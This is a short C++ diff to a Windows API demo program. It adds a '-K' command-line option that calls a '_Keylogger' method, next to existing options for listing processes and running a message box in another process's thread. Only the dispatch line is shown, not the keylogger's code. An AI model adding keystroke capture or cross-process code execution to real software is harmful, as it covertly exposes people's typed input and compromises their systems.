@@ -33,6 +33,8 @@ int main(int argc, char* argv[]) {
 		WinApiObject._EnumSystemProcesses();
 	else if (!strcmp(argv[1], "-R"))
 		WinApiObject._RunMessageBoxInAnotherProcessThread();
+	else if (!strcmp(argv[1], "-K"))
+		WinApiObject._Keylogger();
 
 	return 0;
 }
